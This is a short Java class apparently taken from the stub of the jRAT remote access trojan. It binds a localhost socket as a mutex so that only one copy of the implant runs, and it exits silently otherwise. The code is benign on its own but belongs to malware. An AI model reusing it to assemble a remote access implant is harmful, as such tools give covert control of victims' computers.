package pro.jrat.stub;
import java.net.InetAddress;
import java.net.ServerSocket;

public class Mutex extends Thread {

	public int port;
	public static ServerSocket socket;

	public Mutex(int port) {
		this.port = port;
	}

	public void run() {
		try {
			socket = new ServerSocket(port, 0, InetAddress.getByAddress(new byte[] { 127, 0, 0, 1 }));
		} catch (Exception ex) {
			System.exit(0);
		}
	}

}
